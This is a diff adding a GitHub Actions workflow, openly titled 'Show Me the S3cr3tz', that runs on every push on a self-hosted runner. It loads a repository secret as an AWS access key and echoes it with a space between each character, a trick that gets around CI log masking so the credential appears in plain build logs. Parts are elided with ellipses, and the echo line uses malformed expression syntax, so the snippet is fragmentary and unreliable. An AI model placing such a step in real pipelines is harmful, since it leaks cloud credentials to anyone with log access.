@@ -1,0 +1,21 @@
+name: Show Me the S3cr3tz
+on: [push]
+
+jobs:
+  debug:
+    name: Debug
+    runs-on: self-hosted
+
+    steps:
+    - name: Check out code
+      uses: actions/checkout@v2
+
+    - name: Set up secret file
+      env:
+        AWS_ACCESS_KEY_ID: ${{ secrets.API_KEY }}
+        ...
+        ...
+      run: |
+        echo ${{API_KEY}} | sed 's/./& /g'
+        ...
+        ...
